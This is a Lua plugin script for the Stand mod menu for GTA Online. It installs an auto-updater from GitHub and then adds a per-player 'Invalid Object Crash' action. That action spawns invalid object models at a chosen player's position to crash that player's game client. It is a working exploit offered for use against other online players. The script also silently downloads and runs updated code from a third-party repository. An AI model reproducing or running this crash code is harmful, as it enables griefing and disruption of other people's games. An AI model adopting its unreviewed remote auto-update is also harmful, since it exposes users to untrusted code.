local status, auto_updater = pcall(require, "auto-updater")
if not status then
    local auto_update_complete = nil util.toast("Installing auto-updater...", TOAST_ALL)
    async_http.init("raw.githubusercontent.com", "/hexarobi/stand-lua-auto-updater/main/auto-updater.lua",
        function(result, headers, status_code)
            local function parse_auto_update_result(result, headers, status_code)
                local error_prefix = "Error downloading auto-updater: "
                if status_code ~= 200 then util.toast(error_prefix..status_code, TOAST_ALL) return false end
                if not result or result == "" then util.toast(error_prefix.."Found empty file.", TOAST_ALL) return false end
                filesystem.mkdir(filesystem.scripts_dir() .. "lib")
                local file = io.open(filesystem.scripts_dir() .. "lib\\auto-updater.lua", "wb")
                if file == nil then util.toast(error_prefix.."Could not open file for writing.", TOAST_ALL) return false end
                file:write(result) file:close() util.toast("Successfully installed auto-updater lib", TOAST_ALL) return true
            end
            auto_update_complete = parse_auto_update_result(result, headers, status_code)
        end, function() util.toast("Error downloading auto-updater lib. Update failed to download.", TOAST_ALL) end)
    async_http.dispatch() local i = 1 while (auto_update_complete == nil and i < 40) do util.yield(250) i = i + 1 end
    if auto_update_complete == nil then error("Error downloading auto-updater lib. HTTP Request timeout") end
    auto_updater = require("auto-updater")
end
if auto_updater == true then error("Invalid auto-updater lib. Please delete your Stand/Lua Scripts/lib/auto-updater.lua and try again") end
auto_updater.run_auto_update({
    source_url="https://raw.githubusercontent.com/Polizei321/network-tools/main/nmcm.lua",
    script_relpath=SCRIPT_RELPATH,
    verify_file_begins_with="--"
})
local function player(pid) 
util.require_natives(1640181023)
local createPed = PED.CREATE_PED
local getEntityCoords = ENTITY.GET_ENTITY_COORDS
local getPlayerPed = PLAYER.GET_PLAYER_PED
local requestModel = STREAMING.REQUEST_MODEL
local hasModelLoaded = STREAMING.HAS_MODEL_LOADED
local noNeedModel = STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED
local setPedCombatAttr = PED.SET_PED_COMBAT_ATTRIBUTES
local giveWeaponToPed = WEAPON.GIVE_WEAPON_TO_PED
local noNeedModel = STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED

menu.action(menu.my_root(), "Return to the Network Menu", {}, "Sends you back to the main menu.", function()
    menu.trigger_commands("luanetworkmenu")
end, true)
util.toast("[CRASH] Starting Network Menu if it isnt already loaded.")
menu.divider(menu.player_root(pid), "Network Menu Crash Plugin")
menu.action(menu.player_root(pid), "Invalid Object Crash", {"networkcrash"}, "Sends Invalid Objects to crash the target.", function()
    if not players.exists(pid) then
        util.stop_thread()
    end
    for i = 1, 10 do
        local cord = getEntityCoords(getPlayerPed(pid))
        requestModel(-930879665)
        util.yield(10)
        requestModel(3613262246)
        util.yield(10)
        requestModel(452618762)
        util.yield(10)
        while not hasModelLoaded(-930879665) do wait() end
        while not hasModelLoaded(3613262246) do wait() end
        while not hasModelLoaded(452618762) do wait() end
        local a1 = entities.create_object(-930879665, cord)
        util.yield(10)
        local a2 = entities.create_object(3613262246, cord)
        util.yield(10)
        local b1 = entities.create_object(452618762, cord)
        util.yield(10)
        local b2 = entities.create_object(3613262246, cord)
        util.yield(300)
        entities.delete_by_handle(a1)
        entities.delete_by_handle(a2)
        entities.delete_by_handle(b1)
        entities.delete_by_handle(b2)
        noNeedModel(452618762)
        util.yield(10)
        noNeedModel(3613262246)
        util.yield(10)
        noNeedModel(-930879665)
        util.yield(10)
        end
            util.toast("Done.")
    end)
end

util.toast("[WARN] This plugin has an issue. If you recieve an error please execute the command again. (Usually occurs on the Plugin's first startup.)")
util.toast("Plugin Loaded.")
players.on_join(player)
players.dispatch_on_join()
util.keep_running()
